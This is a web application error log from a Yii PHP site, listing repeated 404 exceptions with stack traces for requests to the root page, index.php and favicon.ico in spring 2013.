2013/04/30 21:10:29 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "favicon.ico".' in /home1/godatwor/public_html/godatworkorgsg/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/godatworkorgsg/framework/web/CWebApplication.php(141): CWebApplication->runController('favicon.ico')
#1 /home1/godatwor/public_html/godatworkorgsg/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/favicon.ico
---
2013/05/02 10:08:59 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "post".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/
---
2013/05/02 10:09:02 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "post".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/
---
2013/05/02 10:09:08 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "post".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/
---
2013/05/02 10:09:09 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "post".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/
---
2013/05/02 10:09:14 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'Unable to resolve the request "post".' in /home1/godatwor/public_html/framework/web/CWebApplication.php:286
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#1 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#2 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#3 {main}
REQUEST_URI=/
---
2013/05/02 10:10:13 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 10:10:19 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 11:36:48 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 11:37:08 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 13:01:52 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 15:01:50 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 15:44:02 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 16:14:02 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 17:27:18 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 17:27:34 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/index.php
---
2013/05/02 17:52:06 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 17:52:09 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 17:52:11 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 17:52:42 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/index.php
---
2013/05/02 17:53:33 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/index.php
---
2013/05/02 17:54:10 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/index.php
---
2013/05/02 17:54:24 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 17:57:59 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:00:02 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:00:37 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:00:39 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:00:39 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:00:40 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:00:59 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:01:09 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:01:57 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:01:59 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:01:59 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:02:04 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:02:04 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:02:05 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:02:17 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/index.php?r=
---
2013/05/02 18:02:22 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/index.php?
---
2013/05/02 18:02:56 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/index.php?
---
2013/05/02 18:02:58 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/index.php?
---
2013/05/02 18:03:02 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:06:13 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:06:17 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:06:18 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:08:40 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:08:45 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:08:47 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
2013/05/02 18:08:51 [error] [exception.CHttpException.404] exception 'CHttpException' with message 'The system is unable to find the requested action "index".' in /home1/godatwor/public_html/framework/web/CController.php:483
Stack trace:
#0 /home1/godatwor/public_html/framework/web/CController.php(270): CController->missingAction('')
#1 /home1/godatwor/public_html/framework/web/CWebApplication.php(282): CController->run('')
#2 /home1/godatwor/public_html/framework/web/CWebApplication.php(141): CWebApplication->runController('')
#3 /home1/godatwor/public_html/framework/base/CApplication.php(169): CWebApplication->processRequest()
#4 /home1/godatwor/public_html/godatworkorgsg/index.php(11): CApplication->run()
#5 {main}
REQUEST_URI=/
---
